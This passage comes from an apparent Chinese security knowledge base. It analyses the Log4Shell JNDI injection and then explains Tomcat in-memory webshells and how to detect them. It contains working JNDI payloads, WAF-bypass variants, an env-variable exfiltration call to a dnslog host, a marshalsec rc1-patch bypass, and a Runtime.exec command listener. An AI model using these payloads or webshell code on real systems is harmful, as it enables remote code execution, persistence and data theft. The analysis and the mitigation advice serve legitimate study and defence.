AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:9, Test 然后一直到了org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder)，这个的主要功能就是通过遍历formatters一段一段的拼接输出的内容 当到了格式化我们传入的内容的时候，同样的会进行format处理，跟进发现会调用converter.format()，converter属于MessagePatternConverter类 所以就到了org.apache.logging.log4j.core.pattern.MessagePatternConverter#format 分析代码，可以看到，如果写入的日志内容中包含${，就会将我们输入的内容从workingBuilder分割出来，赋值给value，然后调用config.getStrSubstitutor().replace()方法 跟进replace()，会调用substitute()方法 在org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List)方法中，会首先遍历字符，通过正则判断，获取${和}的位置，最后截取出${和}中间的内容，得到jndi:xxxx 然后再次递归调用substitute()，继续截取${}中的内容，主要是为了判断是否还有${}，后续还有分隔符的判断，就先不管了 一直跟到解析变量这，跟进这个函数 可以猜测resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器 跟进lookup，就是通过:分割前面的关键词jndi部分和后面的payload内容部分，再获取解析器，通过解析器去lookup 继续跟进org.apache.logging.log4j.core.lookup.JndiLookup#lookup，会初始化JNDI客户端，继续调用lookup 再跟进就是非常常规的JNDI注入点了，分析也到此结束 总结 总结一下整个分析过程，也很简单 先判断内容中是否有${}，然后截取${}中的内容，得到我们的恶意payload jndi:xxx 后使用:分割payload，通过前缀来判断使用何种解析器去lookup 支持的前缀包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，可以研究下其他的，说不定有文章可做 一个小坑 网上有各种百度、icloud等大厂商被打的情况，但是最开始一直认为只有logger.error()才会触发，所以百思不得其解，难道用户搜索的所有内容都会被百度用logger.error()记录下来？很明显这是不可能的啊！！！ 后面研究了半天，忽略了第一句话 此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。 只要输入会被记录，就存在这个问题；什么情况下会记录呢？主要代码还是在 一直跟到最后，intLevel >= level.intLevel()为false，intLevel为我们使用的INFO等级的值200，level.intLevel()则为当前日志记录等级ERROR的值400 这也是为什么log4j默认情况下只会记录error和fatal的日志，如下图，所以我们测试的时候只有logger.error和fatal的时候才会触发。 因此其他日志等级也不是不能触发，修改一下日志记录等级，让它能够记录下来我们输入的payload，就可以触发漏洞了 import org.apache.logging.log4j.Level; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.core.config.Configurator; public class Test { private static Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) { // 第一个参数 \"Test\" 为类名 Configurator.setLevel(\"Test\", Level.INFO); logger.info(\"${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}\"); } } 常规绕过 现在很多WAF都是检测是否存在jndi:等关键词来判断，这个很明显拦得了一时，拦不了一世啊！！！ 通过上面的分析，我们也看到了有很多其他的解析器可用，包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，还有分隔符啥的，结合起来可以绕过大多数常见的WAF了。 多个${}执行流程 先来分析一下多个${}的执行流程，Payload举例如下： ${aaa:${bbb:ccc}dd}${ee:ff} 当识别到多个${}时，准备来说是识别到多个${时，主要分为两种情况： 当属于嵌套类型时，比如${${}}，参数nestedVarCount会执行+1操作，表示存在嵌套，防止找错闭合时用的}，会先处理内部的${}，再将处理结果返回后继续处理${} ；具体的原因，就是因为会递归调用substitute()，所以会先把内部的处理完 当属于并列类型时，比如${}${}，会依次处理${}；因为他一次只会提取一整个${} 分隔符 org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()里处理完${}后，就会有一部分的分隔符处理，一个是valueEscapeDelimiterMatcher [:\\-]，另一个是valueDelimiterMatcher [:-] 先来看第一个valueEscapeDelimiterMatcher，payload ${aa:\\\\-bb} 从下图可以看出来，就是给 :\\- 中的 \\ 去掉了变成了:-，好像是没啥用 再来看看valueDelimiterMatcher，payload ${aa:-bb} 从下面可以看出来，被:-分割成了前后两部分，前面的部分赋值给varName，后面部分赋值给varDefaultValue； varName会被传入到resolveVariable()进行解析，如果没有协议什么的，就会返回null 如果resolveVariable()返回值为null，varDefaultValue在后续的过程中也会递归调用substitute 最后会返回varDefaultValue的值 其他解析器功效 上面分析我们也注意到了，有多个解析协议可用，包括date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，我们来分析一下作用 可以下断点到org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable的resolver.lookup(event, variableName)这一行，然后动态执行看效果；比如 解析协议 说明 date: 日期时间（详情org.apache.logging.log4j.core.lookup.DateLookup#lookup） java: 一些JVM的信息（可用参数version、runtime、vm、os、hw、locale，详情org.apache.logging.log4j.core.lookup.JavaLookup#lookup） marker: 返回event.getMarker()，不知道具体干啥的 ctx:key 返回event.getContextData().getValue(key)，就是获取上下文的数据 lower:KEY 返回字符串小写值 upper:key 返回字符串大写值 jndi: JNDI注入利用点，不多说了 main:key 返回((MapMessage) event.getMessage()).get(key)，也是获取一些变量值 jvmrunargs: 没搞懂。。。 sys:key 返回一些系统属性：System.getProperty(key) env:key 返回System.getenv(key) log4j:key 返回一些log4j的配置信息，可用值configLocation、configParentLocation 绕过思路 我们已经知道了${}的执行流程，也知道了分隔符怎么处理的，又知道了其他协议的解析返回值，那么就可以构造payload来绕过了，举一些例子 原始payload ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} 一些绕过paylioad ${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} 奇淫技巧 刚才分析了其他解析器功效，通过sys和env协议，结合jndi可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码 举个例子 ${jndi:ldap://${env:LOGNAME}.eynz6t.dnslog.cn} 2.15.0-rc1补丁绕过 LOG4J2-3201 Commit 和之前一样，直接来到org.apache.logging.log4j.core.layout.PatternLayout.PatternFormatterPatternSerializer#toSerializable；熟悉的遍历formatter拼接输出内容 到了拼接我们自定义内容的部分的时候，跟进会调用converter.format，可以看到这里的converter类已经变成了MessagePatternConverter.SimpleMessagePatternConverter，SimpleMessagePatternConverter是MessagePatternConverter的一个内部类 跟进，发现会调用((StringBuilderFormattable) msg).formatTo(toAppendTo) 再跟进formatTo，可以看出就是直接拼接字符串，并不会对包含有特殊内容${}的字符串进行处理 看着是没问题了，但是发现在MessagePatternConverter中还有一个内部类LookupMessagePatternConverter，这个类会对${的内容进行特殊处理。 但是怎么样才能让converter的类变成LookupMessagePatternConverter，而不是SimpleMessagePatternConverter呢？ 在newInstance这个初始化配置函数的地方下个断点，发现必须要满足2个条件，才能使用LookupMessagePatternConverter这个converter类 所以这也是补丁绕过比较鸡肋的地方，需要自己手动修改配置，正常人会故意这么写吗？ 为了分析绕过，我们只能手动配置了。。。 分析上面需要满足的2个条件： lookups为true，lookups的值是通过loadLookups(options)这个函数来获得的，分析一下这个函数，只要options这个字符串数组包含lookups即可 需要一个config的实例，属于org.apache.logging.log4j.core.config.DefaultConfiguration这个类，默认不为null 尝试了各种方法修改配置都不行 log4j2.formatMsgNoLookups=false log4j2.formatMsgLookups=true 所以采用了一个暴力的方法，就是在调试的时候动态修改options变量的值 options = new String[]{\"lookups\"} 可以看到，我们修改过后，再次来到converter.format(event, buf)，此时converter属于MessagePatternConverter.LookupMessagePatternConverter类了，目标达成 跟进也是我们想要的结果，对${进行定位判断 跟进replaceIn，就又到了常规的substitute了，接下来几步就不再次分析了 上面这么多都是解决配置问题，让它使用到我们想要的converter类 后面都是和之前类似差不多的，一直到了org.apache.logging.log4j.core.net.JndiManager#lookup，可以看出来加了很大一串try...catch...对我们的payload进行判断，一有不对劲的地方就return null 还是分析一下各个限制 变量 值 allowedProtocols [java, ldap, ldaps] allowedHosts [localhost, 127.0.0.1, d4m1tsdeMacBook-Pro.local, fe80:0:0:0:511a:1574:bca8:fa1b%utun3, fe80:0:0:0:5f4b:9388:9617:a34f%utun2, fe80:0:0:0:da80:893a:2c2b:22c9%utun1, fe80:0:0:0:4936:2ec2:ac06:59d0%utun0, fe80:0:0:0:b853:76ff:fec8:ca3a%llw0, fe80:0:0:0:b853:76ff:fec8:ca3a%awdl0, fe80:0:0:0:aede:48ff:fe00:1122%en5, fe80:0:0:0:1421:ea1:4520:c8ab%en0, 192.168.0.106, fe80:0:0:0:0:0:0:1%lo0, 0:0:0:0:0:0:0:1] allowedClasses [java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Short, java.lang.String] 看似无懈可击，但是却有一个很严重的问题 如果出现URISyntaxException异常，就会直接执行catch，然后就到了this.context.lookup(name)，还是存在JNDI注入 所以我们现在的绕过想法，就是想办法让211行的URI uri = new URI(name);抛出URISyntaxException 分析一下这个报错，就可以发现触发的方式还是挺多的 也可以网上找找，比如： 试一下 所以绕过方法： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/ #Exploit\" 8088 python3 -m http.server 8000 # 127.0.0.1 - - [12/Dec/2021 14:04:04] \"GET /Exploit.class HTTP/1.1\" 200 - ${jndi:ldap://127.0.0.1:8088/ Exploit} 结果，绕过成功 2.15.0-rc2修复 Handle URI exception Commit 从github上提交的代码，可以看出给catch没有return null的问题修复了 暂时还没有好的绕过思路，所以先这样吧 影响范围 srping-boot-strater-log4j2 Apache Solr Apache Flink Apache Druid Apache Struts2 ElasticSearch Flume Dubbo JedisLogstash Kafka ... 修复建议 升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本 升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本，从根源上杜绝大部分常规的JNDI注入 临时措施 在jvm参数中添加 -Dlog4j2.formatMsgNoLookups=true 【针对 2.10.0 及以上的版本】 系统环境变量中将FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true 【针对 2.10.0 及以上的版本】 创建“log4j2.component.properties”文件，文件中增加配置“log4j2.formatMsgNoLookups=true” 【针对 2.10.0 及以上的版本】 限制受影响应用对外访问互联网 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/3.内存马/01.Tomcat内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/3.内存马/01.Tomcat内存马.html","title":"01.Tomcat内存马","keywords":"","body":" 内存马简介 什么是内存马 如何实现内存马 内存马类型 背景知识 Java web三大件 Servlet 请求的处理过程 servlet生命周期 代码示例 Filter 基本工作原理 filter的生命周期 filter链 代码示例 Listener 代码示例 Tomcat Tomcat架构设计 其他知识 反射 java instrumentation servlet-api内存马编写 Filter内存马 ServletContext ApplicationContext Filter相关变量 动态注入内存 Servlet内存马 启动 动态注入内存 Listener内存马 ServletRequestListener接口 动态注入内存 servlet-api总结 内存马查杀 arthas copagent java-memshell-scanner 参考 内存马简介 什么是内存马 随着每年攻防对抗强度的增加，普通的webshell在各大厂商的安全设备下，根本难以存活，想要落地一个实体webshell的难度逐渐增大。逐步完善的过滤机制、前后端分离的趋势，使得传统的webshell生存空间越来越小。于是，随着时代的发展，内存马出现了。 内存马就是一种无需落地文件就能使用的webshell，它将恶意代码写入内存，拦截固定参数来达到webshell的效果。 如何实现内存马 实现目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果 实现方法：以java为例，客户端发起的web请求会依次经过Listener-->Filter-->Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。 内存马类型 根据注入的方式，大概分类以下两类： servlet-api型 通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马 字节码增强型 通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。 背景知识 Java web三大件 详情的可以自己去研究，搜索关键词maven tomcat servlet 开发，这里大概描述一下 Servlet Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 请求的处理过程 浏览器向 Web 服务器发送了一个 HTTP 请求，Servlet容器根据收到的请求，会先创建一个 HttpServletRequest 和 HttpServletResponse 对象 调用相应的 Servlet 程序，在 Servlet 程序运行时，它首先会从 HttpServletRequest 对象中读取数据信息，然后通过 service() 方法处理请求消息 service()方法根据请求类型，分别调用doGet或者doPost方法，其中doXXX方法是我们自己写的逻辑Controller 将处理后的响应数据写入到 HttpServletResponse 对象中。 Web 服务器会从 HttpServletResponse 对象中读取到响应数据，并发送给浏览器 容器关闭时候，会调用destory方法 需要注意的是，在Web服务器运行阶段，每个Servlet都只会创建一个实例对象，针对每次HTTP请求，Web服务器都会调用所请求Servlet实例的 service（HttpServletRequest request，HttpServletResponse response）方法，并重新创建一个 request 对象和一个 response 对象。 servlet生命周期 服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。 servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行 服务器关闭时，销毁这个servlet对象，执行destroy()方法。 由JVM进行垃圾回收。 代码示例 Filter filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 简单来说就是在Servlet处理请求前和Servlet响应请求后实现一些特殊的功能 基本工作原理 1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。 2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。 3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。 4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。 5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。 6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。 filter的生命周期 当服务器启动，就会创建Filter对象（随着Tomcat的启动而创建），并调用init()方法，只调用一次 当访问资源时，路径与filter拦截路径匹配，会执行Filter中的doFilter方法，这个方法是真正拦截操作的方法。 当服务器关闭时，会调用Filter中的destroy方法来进行销毁操作。 filter链 当多个filter同时存在的时候，组成了filter链。 web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。 代码示例 Listener 程序开发中，经常需要对某些事件进行监听，比如监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。 事件：用户的一个操作，如点击按钮 事件源：产生事件的对象。 监听器：负责监听发生在事件源上的事件。 注册监听：将事件，事件源，监听器绑定在一起。当事件源上发生某个事件后，执行监听器代码。 代码示例 import javax.servlet.ServletContextEvent; import javax.servlet.ServletContextListener; import javax.servlet.annotation.WebListener; import javax.servlet.http.HttpSessionAttributeListener; import javax.servlet.http.HttpSessionEvent; import javax.servlet.http.HttpSessionListener; import javax.servlet.http.HttpSessionBindingEvent; @WebListener() public class HelloListener implements ServletContextListener, HttpSessionListener, HttpSessionAttributeListener { // Public constructor is required by servlet spec public HelloListener() { } // ------------------------------------------------------- // ServletContextListener implementation // ------------------------------------------------------- public void contextInitialized(ServletContextEvent sce) { // 初始化资源，例如打开数据库连接池等: /* This method is called when the servlet context is initialized(when the Web application is deployed). You can initialize servlet context related data here. */ } public void contextDestroyed(ServletContextEvent sce) { // 清理WebApp,例如关闭数据库连接池等 /* This method is invoked when the Servlet Context (the Web application) is undeployed or Application Server shuts down. */ } // ------------------------------------------------------- // HttpSessionListener implementation // ------------------------------------------------------- public void sessionCreated(HttpSessionEvent se) { /* Session is created. */ } public void sessionDestroyed(HttpSessionEvent se) { /* Session is destroyed. */ } // ------------------------------------------------------- // HttpSessionAttributeListener implementation // ------------------------------------------------------- public void attributeAdded(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is added to a session. */ } public void attributeRemoved(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is removed from a session. */ } public void attributeReplaced(HttpSessionBindingEvent sbe) { /* This method is invoked when an attribute is replaced in a session. */ } } Tomcat 简单理解，tomcat是http服务器+servlet容器。 Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。 Tomcat架构设计 Tomcat 的本质其实就是一个 WEB 服务器 + 一个 Servlet 容器，那么它必然需要处理网络的连接与 Servlet 的管理，因此，Tomcat 设计了两个核心组件来实现这两个功能，分别是连接器和容器，连接器用来处理外部网络连接，容器用来处理内部 Servlet 一个 Tomcat 代表一个 Server 服务器，一个 Server 服务器可以包含多个 Service 服务，Tomcat 默认的 Service 服务是 Catalina，而一个 Service 服务可以包含多个连接器，因为 Tomcat 支持多种网络协议，包括 HTTP/1.1、HTTP/2、AJP 等等，一个 Service 服务还会包括一个容器，容器外部会有一层 Engine 引擎所包裹，负责与处理连接器的请求与响应，连接器与容器之间通过 ServletRequest 和 ServletResponse 对象进行交流。 在Container容器中包含4个子容器，且存在包含关系，分别是： 容器 实现类 含义 Engine org.apache.catalina.core.StandardEngine 最顶层容器组件，可以包含多个Host Host org.apache.catalina.core.StandardHost 一个Host代表一个虚拟主机，如a.com、b.com，其下可以有多个Context Context org.apache.catalina.core.StandardContext 一个Context代表一个Web应用，如/example、/ROOT、/manager，其下可有多个Wrapper Wrapper org.apache.catalina.core.StandardWrapper 一个Wrapper通常代表一个Servlet，是对Servlet的封装 一个engine可以对一个多个host，也就是虚拟主机，一个host可以对应多个context，也就是web应用，一个context对应多个wrapper，也就是servlet。这个映射关系，通过mapper组件来关联，mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系。Host容器的域名，Context容器中的web路径，Wrapper容器中的servlet映射的路径，这些配置信息是多层次的Map。根据请求定位到指定servlet的流程图如下： 其他知识 反射 反射提供的功能，能在运行时（动态）的 获取一个类的所有成员变量和方法 创建一个类的对象 a. 获取对象成员变量&赋值 b. 调用对象的方法 c. 判断对象所属的类 在注入内存马的过程当中，我们可能需要用到反射机制，例如注入一个servlet型的内存马，我们需要使用反射机制来获取当前的context，然后将恶意的servlet（wrapper）添加到当前的context的children中。 在使用Java反射机制时，主要步骤包括： 获取目标类型的Class对象 通过Class对象分别获取Constructor类对象、Method类对象和Field类对象 通过Constructor类对象、Method类对象和Field类对象分别获取类的构造函数、方法&属性的具体信息，并进行后续操作 java instrumentation Java Intrumentation 和相关应用 动态 Instrumentation 是 Java SE 5 的新特性，它在 java.lang.instrument 包中，它把 Java 的 instrument 功能从本地代码中释放出来，使其可以用 Java 代码的方式解决问题。使用 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至可以替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的虚拟机监控和 Java的类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP方式，使得开发者无需对原有应用做任何修改，就可以实现类的动态修改和增强 java.lang.instrument 包被赋予了更强大的功能：启动后的 监测、本地代码（native code）监测，以及动态改变 classpath 等等。这些改变，意味着 Java 具有了更强的动态控制与解释能力，它使得 Java 语言变得更加灵活多变。 Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。 在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。 servlet-api内存马编写 所有内存马编写时，都可以自己写一个对应的东西，比如filter、servlet，然后去跟一下Tomcat本身是如何去添加这些东西的，最后模拟一下这个过程动态添加就行了 Filter内存马 Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了 一般我们把这个Filter放在所有的filter最前面优先执行，也就是filter链的第一个，这样我们的请求就不会受到其他filter的干扰 需要动态注册filter就需要添加filter相关的库、函数等 ServletContext 需要动态注册filter就需要几个添加filter相关的函数，ServletContext恰好可以满足这个条件 javax.servlet.servletContext中存在addFilter，addServlet，addListener方法，即添加Filter，Servlet，Listener 获取ServletContext的方法：this.getServletContext();、this.getServletConfig().getServletContext(); ApplicationContext 在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取上下文StandardContext Filter相关变量 名称 说明 filterMaps 变量 存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern filterDefs 变量 存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息 filterConfigs 变量 存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息 FilterChain 变量 过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter ApplicationFilterChain 调用过滤器链 ApplicationFilterConfig 获取过滤器 ApplicationFilterFactory 组装过滤器链 StandardContext Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper** StandardWrapperValve 一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet org.apache.catalina.core.ApplicationFilterConfig 在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef // tomcat 7 import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterMap; import org.apache.tomcat.util.descriptor.web.FilterDef; 动态注入内存 需要调试的话，直接给想要调试的代码写到servlet里面就可以调试了，避免去尝试调试JSP 流程： 创建一个恶意Filter 利用FilterDef对Filter进行一个封装 将FilterDef添加到FilterDefs和FilterConfig 创建FilterMap ，将我们的Filter和urlpattern相对应，存放到filterMaps中（由于Filter生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的Filter最先触发） Tomcat中的对应的ServletContext实现是ApplicationContext，在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。 当我们能直接获取 request 的时候，可以直接将 ServletContext 转为 StandardContext 从而获取 context。 Servlet内存马 启动 常规情况下在启动时，会自动调用StandardContext.addServletMappingDecoded()方法给我们定义的路由和名字加进去，所有后面动态注入也是利用的这个方法，获取到StandardContext然后添加即可，前提是要给这个servlet先添加到children中 servletMappings和前提判断条件 findChild() addChild() 会给我们创建的servlet/wrapper添加到children中 动态注入内存 下面的代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。 执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。 比如早期rebeyond师傅开发的memshell，就是通过修改org.apache.catalina.core.ApplicationFilterChain类的internalDoFilter方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择hook javax.servlet.http.HttpServlet#service 函数，在weblogic选择hook weblogic.servlet.internal.ServletStubImpl#execute 函数。 Listener内存马 Listener的监听主要分为三类： ServletContext监听：用于对Servlet整个上下文进行监听（创建、销毁） Session监听：对Session的整体状态的监听 Request监听：用于对Request请求进行监听（创建、销毁） 对于这三类，熟悉java和Tomcat的同学应该知道，对于request的请求和篡改是常见的利用方式，另两者涉及到服务器的启动跟停止，或者是Session的建立跟销毁，就不太适合 ServletRequestListener接口 该接口实现的方法有requestDestroyed，requestInitialized，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分 在requestInitialized这个函数中，我们从servletRequestEvent参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下 public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } 这里是没有回显的，盲的 动态注入内存 servlet-api总结 以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中 姿势 优点 缺点 Filter 通过添加全局拦截器对参数进行拦截，来进行恶意代码执行通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器 引入filterMaps，filterDef，要根据tomcat版本来判断代码量较高 Servlet 简单方便，了解Servlet生命周期即可更直观了解如何动态添加ServletMapping 无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发 Listener 简单方便，通过添加监听器对request进行监控在任意url中都能设置我们监听的参数 只要监听的参数含有就会进入监听代码中如果在该jsp页面下访问，则会重放请求 内存马查杀 查杀感觉很多都是依赖于Java agent去查杀的。 arthas Arthas 是Alibaba开源的Java诊断工具 地址：https://github.com/alibaba/arthas 使用文档 很详细，可以慢慢研究 下载arthas-boot.jar，然后用java -jar的方式启动： curl -O https://arthas.aliyun.com/arthas-boot.jar java -jar arthas-boot.jar 通过mbean命令，可以便捷的查看或监控 Mbean 的属性信息（可以查看异常Filter/Servlet节点） 使用jad反编译class源码(感觉是依赖于cfr-decompiler这个小工具) copagent Java内存马提取工具，arthas的改进版，可以确定风险等级，并且将内存中的信息全部输出 地址：https://github.com/LandGrey/copagent 下载cop.jar，然后启动 wget https://github.com/LandGrey/copagent/raw/release/cop.jar java -jar cop.jar 查看输出结果 找到相关的class文件并反编译 java-memshell-scanner 通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。 地址：https://github.com/c0ny1/java-memshell-scanner dump下来反编译 参考 Tomcat内存马 tomcat无文件内存webshell Tomcat Filter类型内存马与查杀技术学习：比较详细比较细，分析每一步为什么要这样做也很详细 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/01.Java安全/3.内存马/02.Spring内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/3.内存马/02.Spring内存马.html","title":"02.Spring内存马","keywords":"","body":" 前言 基础知识 Bean ApplicationContext 其他 Root Context 和 Child Context ContextLoaderListener DispatcherServlet Controller实现方式 Controller技术实现 获取上下文的环境 手动注册Controller 方法一:registerMapping 方法二:registerHandler 方法三：detectHandlerMethods webshell 注意事项 SpringBoot生命周期 Interceptor实现 拦截器代码 正常注册拦截器 效果 恶意注册拦截器 应用场景 漏洞演示 参考 前言 